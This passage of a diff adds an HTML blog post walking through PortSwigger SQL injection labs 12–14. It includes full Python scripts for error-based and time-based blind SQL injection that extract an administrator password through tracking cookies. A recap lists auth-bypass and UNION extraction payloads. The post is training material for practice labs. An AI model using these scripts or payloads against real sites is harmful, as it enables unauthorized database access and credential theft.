+                sys.stdout.<span class="fn">flush</span>()
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    <span class="kw">if</span> <span class="fn">len</span>(sys.argv) <span class="op">!=</span> <span class="num">2</span>:
+        <span class="fn">print</span>(<span class="str">"(+) Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+    url <span class="op">=</span> sys.argv[<span class="num">1</span>]
+    <span class="fn">print</span>(<span class="str">"(+) Retrieving administrator password..."</span>)
+    <span class="fn">sqli_password</span>(url)
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="fn">main</span>()</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-12.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END</td>
+            <td>The core trick. <code>CASE WHEN (condition) THEN TO_CHAR(1/0)</code> — if the condition is true, Oracle evaluates <code>TO_CHAR(1/0)</code>, which divides by zero and throws an error. If false, it returns an empty string. The character extraction condition is embedded in the WHERE clause of the subquery.</td>
+          </tr>
+          <tr>
+            <td>String concatenation with || '</td>
+            <td>The payload is embedded in the middle of the cookie's string value. The leading <code>'</code> breaks out of the string, the <code>||</code> concatenates the CASE subquery result back in, and the trailing <code>|| '</code> ensures the SQL stays syntactically valid when the result is an empty string.</td>
+          </tr>
+          <tr>
+            <td>r.status_code == 500</td>
+            <td>The observable oracle. A 500 means the database threw an error — condition was true. A 200 means the CASE returned empty string — condition was false. Cleaner than parsing response text.</td>
+          </tr>
+          <tr>
+            <td>CASE WHEN (1=1) THEN...</td>
+            <td>Note the payload uses <code>CASE WHEN (1=1)</code> with the character condition in the WHERE clause. This means: "always try to divide by zero, but only if the WHERE clause matches" — the WHERE clause filters to the row where both username is administrator AND the current character matches.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Error-based blind SQLi exploits the fact that HTTP status codes differ between normal and error states. The <code>CASE WHEN ... THEN [error] ELSE [safe] END</code> pattern is powerful and portable — the error trigger varies by database (<code>TO_CHAR(1/0)</code> for Oracle, <code>1/0</code> for PostgreSQL, <code>CONVERT(int, 'a')</code> for MSSQL) but the logical structure is the same.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 13 ═══════════════════ -->
+      <div class="lab-section" id="lab13">
+        <div class="lab-header">
+          <div class="lab-num">13</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">Blind SQLi — Triggering Time Delays</h2>
+            <div class="lab-goal">Goal: <span>Confirm a blind SQLi vulnerability by causing the database to sleep for 10 seconds using <code>pg_sleep()</code></span></div>
+          </div>
+        </div>
+
+        <h3>Time-based blind SQLi: a different oracle</h3>
+        <p>
+          When an application returns identical responses for true and false conditions <em>and</em> suppresses all database errors (showing a generic error page or silently failing), both boolean-based and error-based techniques fail. Time-based blind SQLi introduces a third oracle: response time.
+        </p>
+        <p>
+          By injecting a conditional sleep function, you force the database to pause for a known duration when a condition is true. If the HTTP response arrives 10 seconds later, the condition was true. If it arrives immediately, it was false. The injected query doesn't need to return data or produce an error — just delay.
+        </p>
+        <div class="vuln-query">
+          <span class="label">PostgreSQL — unconditional sleep</span>
+          <span class="injected">' || (SELECT pg_sleep(10))--</span>
+          <br/>
+          <span class="normal" style="color:#f5a623">→ response delayed 10 seconds = injection confirmed</span>
+        </div>
+        <p>
+          This lab is just a confirmation step — you're verifying the injection point is viable before attempting full extraction in Lab 14. The <code>pg_sleep(10)</code> is PostgreSQL-specific. MSSQL uses <code>WAITFOR DELAY '0:0:10'</code>, MySQL uses <code>SLEEP(10)</code>, and Oracle uses <code>dbms_pipe.receive_message('a',10)</code>.
+        </p>
+
+        <div class="callout danger">
+          <div class="callout-title">⚠️ Bug in the original script</div>
+          <p>There's a typo in the original proxies dict: <code>'http': 'http:127.0.0.1:8080'</code> — missing the <code>//</code>. Fix to <code>'http://127.0.0.1:8080'</code>. There's also a <code>pring()</code> typo in the usage message — should be <code>print()</code>. Neither crashes the core function but the proxy won't route correctly without the fix.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-13.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> sys
+<span class="kw">import</span> requests
+<span class="kw">import</span> urllib3
+<span class="kw">import</span> urllib
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}  <span class="cmt"># fixed</span>
+
+<span class="kw">def</span> <span class="fn">blind_sqli_check</span>(url):
+    sqli_payload <span class="op">=</span> <span class="str">"' || (SELECT pg_sleep(10))--"</span>
+    sqli_payload_encoded <span class="op">=</span> urllib.parse.<span class="fn">quote</span>(sqli_payload)
+    cookies <span class="op">=</span> {<span class="str">'TrackingId'</span>: <span class="str">'fY3mWGvtddfW37rS'</span> <span class="op">+</span> sqli_payload_encoded, <span class="str">'session'</span>: <span class="str">'3tjAqEsmAUv1oSufDDKMp8Dpr9LKqwcd'</span>}
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url, cookies<span class="op">=</span>cookies, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="fn">int</span>(r.elapsed.total_seconds()) <span class="op">&gt;</span> <span class="num">10</span>:
+        <span class="fn">print</span>(<span class="str">"(+) Vulnerable to blind-based SQL injection"</span>)
+    <span class="kw">else</span>:
+        <span class="fn">print</span>(<span class="str">"(-) Not vulnerable to blind based SQL injection"</span>)
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    <span class="kw">if</span> <span class="fn">len</span>(sys.argv) <span class="op">!=</span> <span class="num">2</span>:
+        <span class="fn">print</span>(<span class="str">"(+) Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+    url <span class="op">=</span> sys.argv[<span class="num">1</span>]
+    <span class="fn">print</span>(<span class="str">"(+) Checking if tracking cookie is vulnerable to time-based blind SQLi..."</span>)
+    <span class="fn">blind_sqli_check</span>(url)
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="fn">main</span>()</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-13.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>pg_sleep(10)</td>
+            <td>PostgreSQL function that suspends execution for 10 seconds. The <code>||</code> concatenation appends the sleep call to the tracking cookie's string context — PostgreSQL evaluates the entire expression including the subquery. The sleep happens before the response is sent.</td>
+          </tr>
+          <tr>
+            <td>r.elapsed.total_seconds()</td>
+            <td>The <code>requests</code> library tracks how long each request takes via <code>response.elapsed</code>. <code>total_seconds()</code> converts the timedelta to a float. If the sleep fired, this will be 10+ seconds; if not, it's typically under 1 second.</td>
+          </tr>
+          <tr>
+            <td>threshold > 10</td>
+            <td>The condition is slightly lenient — we expect exactly 10 seconds, but network jitter and processing overhead might push it to 10.2 seconds. A threshold of 9 is safe without false positives in normal conditions.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Time-based blind SQLi is the technique of last resort — it works even when nothing else does, because you're not relying on any application-level output. The tradeoff is speed: every true/false question requires a full sleep cycle. Extracting a 20-character password with a 10-second sleep per character takes over 3 minutes at best. Lab 14 shows the full extraction version.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 14 ═══════════════════ -->
+      <div class="lab-section" id="lab14">
+        <div class="lab-header">
+          <div class="lab-num">14</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">Blind SQLi — Time-Delay Password Extraction</h2>
+            <div class="lab-goal">Goal: <span>Combine conditional logic with <code>pg_sleep()</code> to extract the administrator password one character at a time via response timing</span></div>
+          </div>
+        </div>
+
+        <h3>Combining conditional logic with sleep</h3>
+        <p>
+          Lab 13 was just a proof-of-concept for the sleep technique. Lab 14 combines it with character extraction: the sleep only fires when the current character guess is correct. You iterate over each character position and every printable ASCII value, measure the response time for each guess — a 10-second delay means a hit, an instant response means a miss.
+        </p>
+        <p>
+          The payload uses PostgreSQL's <code>CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(-1) END</code>. The <code>pg_sleep(-1)</code> for the false branch is intentional — it forces an immediate return (negative values are treated as 0) rather than relying on the CASE simply not sleeping.
+        </p>
+        <div class="vuln-query">
+          <span class="label">conditional sleep payload (PostgreSQL)</span>
+          <span class="injected">' || (SELECT CASE WHEN (username='administrator' AND ascii(substring(password,1,1))='97') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--</span>
+          <br/>
+          <span class="normal" style="color:#f5a623">→ 10s delay = first char is 'a' (ASCII 97)</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ instant response = not a match, try next ASCII value</span>
+        </div>
+        <p>
+          This produces up to 1880 requests in the worst case (20 chars × 94 ASCII values). In practice it's faster because you break on the first match per position — and common password characters appear earlier in the ASCII range.
+        </p>
+
+        <div class="callout warning">
+          <div class="callout-title">⚠️ Time-based attacks are fragile</div>
+          <p>Network latency jitter can cause false positives or missed detections if the server is slow or the connection is unstable. For more reliable extraction, use a threshold slightly below the sleep value (e.g., threshold of 9 for a 10-second sleep). If you're behind a high-latency connection, increase the sleep duration to 15 or 20 seconds.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-14.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> sys
+<span class="kw">import</span> requests
+<span class="kw">import</span> urllib3
+<span class="kw">import</span> urllib
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">sqli_password</span>(url):
+    password_extracted <span class="op">=</span> <span class="str">""</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">21</span>):
+        <span class="kw">for</span> j <span class="kw">in</span> <span class="fn">range</span>(<span class="num">32</span>, <span class="num">126</span>):
+            sql_payload <span class="op">=</span> <span class="str">"' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--"</span> <span class="op">%</span> (i, j)
+            sql_payload_encoded <span class="op">=</span> urllib.parse.<span class="fn">quote</span>(sql_payload)
+            cookies <span class="op">=</span> {<span class="str">'TrackingId'</span>: <span class="str">'4kvqBxnpvcbcGVXk'</span> <span class="op">+</span> sql_payload_encoded, <span class="str">'session'</span>: <span class="str">'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'</span>}
+            r <span class="op">=</span> requests.<span class="fn">get</span>(url, cookies<span class="op">=</span>cookies, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+            <span class="kw">if</span> <span class="fn">int</span>(r.elapsed.total_seconds()) <span class="op">&gt;</span> <span class="num">9</span>:
+                password_extracted <span class="op">+=</span> <span class="fn">chr</span>(j)
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted)
+                sys.stdout.<span class="fn">flush</span>()
+                <span class="kw">break</span>
+            <span class="kw">else</span>:
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted <span class="op">+</span> <span class="fn">chr</span>(j))
+                sys.stdout.<span class="fn">flush</span>()
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    <span class="kw">if</span> <span class="fn">len</span>(sys.argv) <span class="op">!=</span> <span class="num">2</span>:
+        <span class="fn">print</span>(<span class="str">"(+) Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+    url <span class="op">=</span> sys.argv[<span class="num">1</span>]
+    <span class="fn">print</span>(<span class="str">"(+) Retrieving administrator password..."</span>)
+    <span class="fn">sqli_password</span>(url)
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="fn">main</span>()</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-14.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>CASE WHEN (...) THEN pg_sleep(10) ELSE pg_sleep(-1)</td>
+            <td>When the character guess is correct: sleep 10 seconds. When wrong: sleep -1 (effectively 0, instant). This is more explicit than the ELSE branch doing nothing — it ensures a clean binary timing signal with no ambiguity about whether the false branch might also delay.</td>
+          </tr>
+          <tr>
+            <td>Both conditions in WHEN clause</td>
+            <td><code>username='administrator' AND ascii(substring(password,i,1))='j'</code> — the username filter ensures we're reading from the right row. Without it, if multiple users exist with different passwords, the CASE might fire on any of them and produce garbage.</td>
+          </tr>
+          <tr>
+            <td>elapsed.total_seconds() > 9</td>
+            <td>Threshold set to 9 (not 10) to account for minor network overhead. In practice, a genuine 10-second sleep will consistently show as 10.0–10.5s. The 1-second margin is enough to distinguish from normal fast responses (typically &lt;1s).</td>
+          </tr>
+          <tr>
+            <td>Performance characteristics</td>
+            <td>Worst case: 20 positions × 94 ASCII values × 10 seconds = ~5.2 hours. In practice passwords use lowercase alphanumeric chars — the inner loop hits the correct character on average halfway through its range, and the sleep only fires on matches. Realistic runtime is 20–40 minutes for a 20-char password.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Time-based blind SQLi is the most complete technique because it works regardless of what the application does with query results or errors. The cost is time — it's inherently slow because you're waiting for real clock seconds as your information signal. For real engagements, automated tools with binary search optimization (sqlmap does this) can reduce the request count from ~1880 to ~140 per character using binary search on the ASCII value.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════ RECAP ═══════════════════ -->
+      <hr />
+
+      <div id="recap">
+        <h3 style="font-family: var(--display); font-size: 1.4rem; font-weight: 700; margin-bottom: 1.25rem;">Series Recap — Labs 1–14</h3>
+        <p>Fourteen labs in, we've covered the full arc from trivial filter bypass to the most robust blind extraction technique. Here's the complete mental model in one view:</p>
+        <div class="conclusion-grid">
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 1–2 — Break the query</div>
+            <p>Single quote escapes string context. <code>OR 1=1--</code> bypasses filters. <code>administrator'--</code> bypasses auth. CSRF tokens don't help.</p>
+          </div>
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 3–4 — UNION prep</div>
+            <p>ORDER BY probing for column count. NULL substitution to find the string-typed column. The required groundwork before any UNION exfil.</p>
+          </div>
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 5–6 — UNION exfil</div>
+            <p>Directly pull <code>username, password FROM users</code>. When only one string column is available, concatenate with <code>||</code> and split on a separator.</p>
+          </div>
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 7–8 — Fingerprinting</div>
+            <p>Oracle uses <code>v$version</code> and needs <code>FROM dual</code>. MySQL/MSSQL use <code>@@version</code>. Know your DB type before writing payloads.</p>
+          </div>
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 9–10 — Schema enumeration</div>
+            <p><code>information_schema</code> for non-Oracle. <code>all_tables</code> / <code>all_tab_columns</code> for Oracle. Tables → columns → data.</p>
+          </div>
+          <div class="conclusion-card">
+            <div class="conclusion-card-title">Labs 11–14 — Blind techniques</div>
+            <p>Boolean (response text), error-based (HTTP 500), time-based (pg_sleep). Each works when the previous one fails. Time is the last resort but always works.</p>
+          </div>
+        </div>
+
+        <div class="callout success">
+          <div class="callout-title">✅ Up next — Lab 15</div>
+          <p>The next lab moves into out-of-band SQLi — exfiltrating data via DNS lookups rather than HTTP responses or timing. Requires <code>xxe_sleep</code>-style payloads and a collaborator listener, representing a different class of exfiltration entirely.</p>
+        </div>
+      </div>
+
+    </article>
+
+    <div class="post-footer">
+      <a href="../blog.html" class="btn">← Back to blog</a>
+      <a href="sql-injection.html" class="btn btn-accent">SQLi Overview →</a>
+    </div>
+
+  </div>
+
+  <footer>
+    <span>© 2025 Vali Hakuryuko</span>
+    <span class="footer-back" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑ back to top</span>
+  </footer>
+
+  <script>
+    // Theme
+    const root = document.documentElement;
+    root.setAttribute('data-theme', localStorage.getItem('theme') || 'dark');
+    function toggleTheme() {
+      const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      root.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    }
+
+    // Copy button
+    function copyCode(btn) {
+      const pre = btn.closest('.code-block').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'copied!';
+        setTimeout(() => btn.textContent = 'copy', 2000);
+      });
+    }
+  </script>
+</body>
+</html>
